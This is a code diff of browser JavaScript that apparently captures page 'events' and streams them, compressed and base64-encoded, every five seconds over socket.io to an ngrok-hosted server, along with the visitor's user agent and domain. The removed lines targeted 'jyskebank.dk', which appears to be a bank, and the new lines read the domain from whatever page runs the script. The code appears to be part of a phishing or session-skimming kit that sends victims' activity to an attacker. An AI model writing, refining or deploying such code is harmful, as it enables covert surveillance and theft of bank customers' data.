@@ -24,27 +24,14 @@
 
     (async function() {
 
-        function rnd(min, max) {
-            return Math.floor(Math.random() * (max - min + 1) ) + min;
-        }
-
-        /*function compress(decompressed) {
+        function compress(decompressed) {
             var data = new TextEncoder().encode(JSON.stringify(decompressed));
             var compressed = fflate.gzipSync(data);
-            return Buffer.from(compressed).toString("base64");
-        }*/
-        function compress(decompressed) {
-            const data = new TextEncoder().encode(JSON.stringify(decompressed));
-            const compressed = fflate.gzipSync(data);
-
-            // safe Base64 conversion (no stack issues)
             let binary = "";
-            const len = compressed.length;
-
+            var len = compressed.length;
             for (let i = 0; i < len; i++) {
                 binary += String.fromCharCode(compressed[i]);
             }
-
             return btoa(binary);
         }
 
@@ -56,7 +43,7 @@
         });
 
         var server = "https://glorious-disgrace-unroasted.ngrok-free.dev";
-        var domain = "jyskebank.dk";
+        var domain = location.host;
         var interval = 5000;
         var user = {
             userAgent: navigator.userAgent || "N/A",
@@ -80,7 +67,7 @@
 
         var socket = io(server);
 
-        socket.emit("join", {user,ip:`${rnd(1, 9)}.${rnd(1, 9)}.${rnd(1, 9)}.${rnd(1, 9)}`/*"118.67.131.217"*/,domain});
+        socket.emit("join", {user,domain});
 
         setInterval(function() {
             var compressedEvents = compress(events);
